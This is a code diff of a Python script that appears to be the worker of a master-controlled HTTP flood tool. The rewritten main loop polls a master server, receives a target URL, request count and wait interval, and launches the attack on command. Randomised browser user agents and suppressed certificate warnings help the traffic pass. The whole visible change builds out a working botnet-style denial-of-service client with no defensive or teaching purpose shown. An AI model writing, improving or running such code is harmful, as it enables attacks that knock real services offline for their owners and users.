@@ -10,13 +10,10 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 # Constants
 VERBOSE = True
-TOTAL_REQUESTS = 90000
-CONCURRENT_REQUESTS = 1000
-
 METHOD = "GET"
-TARGET_URL = "http://127.0.0.1:5000"
+MASTER_URL = "http://127.0.0.1:5000"
 WAIT_TIME = 5
-TIMEOUT = 30
+TIMEOUT = 10
 USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
@@ -136,45 +133,52 @@ def init_attack(
             show_message(f"The request {index} could not be sent.")
 
     # Wait before continuing
-    del requests_list
     show_message(f"Waiting {wait_time} seconds before continuing...\n")
-    threading.Thread(target=ask_for_target).start()
     time.sleep(wait_time)
 
 
-def ask_for_target():
-    solicitud = requests.get("http://127.0.0.1:5000", timeout=WAIT_TIME)
-    if solicitud.status_code == 200:
-        respuesta = solicitud.json()
-        return respuesta
-
-
-import threading
-
 # Main function
 if __name__ == "__main__":
-    # Esperar hasta que el maestro nos envíe la señal
-    empezar_ataque = False
-    attack_data = {}
+    while True:
+        try:
+            # Check if the master is ready
+            response = requests.get(MASTER_URL, timeout=TIMEOUT)
+            status_code = response.status_code
 
-    # Main loop
-    try:
-        while True:
-            if respuesta_maestro["signal"]:
-                # Show initial message
-                show_message(f"Starting the attack on {TARGET_URL}...")
-                show_message(
-                    f"Sending {TOTAL_REQUESTS} requests each {WAIT_TIME} seconds...\n"
-                )
+            # Check if the master is ready
+            if status_code == 200:
+                # Get the attack data
+                attack_data = response.json()
+                start_attack = attack_data.get("total_requests", 0) > 0
 
-                while True:
-                    init_attack(**respuesta_maestro["payload"])
+                # Start the attack
+                if start_attack:
+                    show_message(
+                        f"Starting the attack on {attack_data['target_url']}..."
+                    )
+                    show_message(
+                        f"Sending {attack_data['total_requests']} requests each {attack_data['wait_time']} seconds...\n"
+                    )
+                    init_attack(**attack_data)
+                else:
+                    show_message(
+                        "The master is ready but there are no requests to send."
+                    )
+                    show_message(
+                        f"Waiting {WAIT_TIME} seconds before trying again...\n"
+                    )
             else:
-                time.sleep(5)
-                show_message("Esperando señal del maestro...")
-                respuesta_maestro = ask_for_target()
+                show_message(f"The master responded with status code {status_code}.")
+                show_message(f"Waiting {WAIT_TIME} seconds before trying again...\n")
+        except requests.exceptions.RequestException:
+            show_message(f"The master isn't available.")
+            show_message(f"Waiting {WAIT_TIME} seconds before trying again...\n")
+        except KeyboardInterrupt:
+            show_message("The process has been stopped.")
+            break
+        except Exception as error:
+            show_message(f"An unexpected error occurred: {error}")
+            break
 
-    except KeyboardInterrupt:
-        show_message("The process has been stopped.")
-    except Exception as error:
-        show_message(f"An unexpected error occurred: {error}")
+        # Wait before trying again
+        time.sleep(WAIT_TIME)
